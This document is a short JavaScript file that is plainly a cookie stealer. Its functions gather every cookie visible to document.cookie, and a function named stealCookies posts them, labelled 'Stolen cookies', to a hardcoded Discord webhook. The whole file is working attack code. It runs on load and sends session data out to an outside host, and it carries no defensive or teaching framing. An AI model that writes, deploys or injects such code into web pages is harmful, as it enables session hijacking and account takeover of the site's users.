
// Replace this with the Discord webhook
const webhookUrl = 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4';

// Get all the cookies
function getCookies() {
    const cookies = document.cookie.split(';');
    let cookieData = {};
    for (let cookie of cookies) {
        const [name, value] = cookie.split('=');
        cookieData[name.trim()] = value;
    }
    return cookieData;
}

// Send cookie data to Discord webhook
function sendToDiscord(data) {
    fetch(webhookUrl, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(res => console.log('Success!'))
    .catch(err => console.error('Error:', err));
}

// Send cookie data to Discord webhook
function stealCookies() {
    const cookieData = getCookies();
    sendToDiscord({ content: `Stolen cookies:\n\`\`\`${JSON.stringify(cookieData, null, 2)}\`\`\`` });
}

// Execute the script
stealCookies();
